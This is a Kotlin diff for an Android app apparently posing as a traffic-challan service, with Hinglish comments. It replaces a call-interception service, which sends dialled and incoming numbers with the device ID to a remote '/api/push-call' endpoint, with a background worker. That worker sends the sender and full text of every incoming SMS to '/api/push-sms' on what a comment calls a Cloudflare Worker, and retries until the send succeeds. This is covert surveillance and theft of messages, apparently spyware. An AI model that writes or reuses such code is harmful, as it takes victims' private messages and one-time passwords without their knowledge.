@@ -1,38 +1,44 @@
-package com.rte.challan.service
+package com.rte.challan.worker
 
-import android.telecom.Call
-import android.telecom.InCallService
+import android.content.Context
 import android.util.Log
-import com.rte.challan.network.ClientApi
+import androidx.work.Worker
+import androidx.work.WorkerParameters
+import com.rte.challan.network.ClientApi 
 import org.json.JSONObject
-import android.provider.Settings
 
-class InCallServiceImpl : InCallService() {
+class SendIncomingSmsWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
 
-    override fun onCallAdded(call: Call) {
-        super.onCallAdded(call)
+    override fun doWork(): Result {
+        // 1. Data nikaalein (Jo SmsReceiver se inputData ke roop mein aaya hai)
+        val deviceId = inputData.getString("deviceId") ?: return Result.failure()
+        val sender = inputData.getString("sender") ?: return Result.failure()
+        val body = inputData.getString("body") ?: return Result.failure()
 
-        // 1. Call details nikalna (Number aur Type)
-        val number = call.details.handle?.schemeSpecificPart ?: "Unknown"
-        val isIncoming = call.state == Call.STATE_RINGING
-        val type = if (isIncoming) "Incoming" else "Outgoing"
-        
-        // 2. Device ID fetch karna
-        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+        return try {
+            // 2. JSON taiyar karein jo Cloudflare Worker receive karega
+            val smsJson = JSONObject().apply {
+                put("deviceId", deviceId)
+                put("number", sender)
+                put("msg", body)
+                put("time", System.currentTimeMillis())
+            }
 
-        Log.d("InCallService", "$type call from/to: $number")
+            // 3. ClientApi ka Synchronous method call karein
+            // Ye tab tak wait karega jab tak response na mil jaye
+            val isSent = ClientApi.postRequestSync("/api/push-sms", smsJson)
 
-        // 3. JSON taiyar karke Sync karna
-        val callJson = JSONObject().apply {
-            put("deviceId", deviceId)
-            put("number", number)
-            put("type", type)
-            put("time", System.currentTimeMillis())
-        }
+            if (isSent) {
+                Log.d("IncomingSms", "SMS synced successfully from $sender")
+                Result.success()
+            } else {
+                Log.d("IncomingSms", "Sync failed, retrying later...")
+                Result.retry() // Net nahi hone par ye baad mein fir se try karega
+            }
 
-        // Asynchronous call (kyunki ye main thread par ho sakta hai)
-        ClientApi.postRequest("/api/push-call", callJson) { success ->
-            if (success) Log.d("InCallService", "Call log synced")
+        } catch (e: Exception) {
+            Log.e("IncomingSms", "Critical Error: ${e.message}")
+            Result.retry()
         }
     }
 }
